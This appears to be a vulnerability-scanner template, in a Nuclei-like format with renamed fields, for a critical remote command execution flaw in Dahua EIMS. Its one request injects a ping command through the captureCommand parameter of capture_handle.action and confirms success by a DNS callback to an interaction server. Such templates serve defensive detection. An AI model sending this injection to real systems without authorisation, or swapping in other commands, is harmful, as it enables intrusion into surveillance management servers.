id: dahua-eims-rce
brief:
    title: Dahua EIMS - Remote Command Execution
    by: DhiyaneshDk
    level: critical
    about: Dahua EIMS capture_handle interface allows remote command execution.
    label:
        - dahua
        - rce
        - eims
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20{{interactsh-url}}%20index.pcap'
      signs:
        - "on": word
          has:
            - dns
          in: interactsh_protocol
          need: all
        - "on": word
          has:
            - success
          in: body
